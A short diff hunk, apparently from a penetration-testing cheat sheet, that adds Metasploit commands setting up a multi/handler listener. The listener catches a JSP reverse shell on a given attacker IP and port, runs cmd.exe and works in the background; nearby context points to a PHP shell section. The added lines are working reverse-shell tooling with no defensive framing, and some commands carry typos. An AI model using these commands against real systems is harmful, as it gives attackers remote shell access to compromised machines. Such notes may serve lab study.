@@ -49,6 +49,18 @@ set LPORT <LPORT value>
 set ExitOnSession false
 exploit -j -z
 
+mssf > use exploit/multi/handler 
+msf exploit(handler) > setg PAYLOAD java/jsp_shell_reverse_tcp
+PAYLOAD => java/jsp_shell_reverse_tcp
+set LHOST 10.11.0.159
+set LPORT 4343
+LPORT => 4343
+msetg SHELL cmd.exe
+exploit -j -z
+
+
+
+
 
     
     == PHP shell. Execute some PHP code on a HTML/PHP page ==
